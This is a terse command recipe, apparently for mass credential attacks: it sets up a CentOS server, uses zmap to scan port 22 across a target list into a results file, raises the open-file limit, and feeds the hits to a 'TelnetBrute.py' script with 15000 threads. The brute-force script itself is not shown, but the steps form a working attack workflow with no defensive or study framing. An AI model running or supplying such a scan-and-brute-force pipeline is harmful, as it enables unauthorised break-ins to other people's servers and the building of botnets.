CentOS 6.9 2gb 

install zmap

yum update -y 

zmap -p22 -o mfu.txt -w Legend.lst 

ulimit -n 999999

python TelnetBrute.py mfu.txt 15000 test.txt
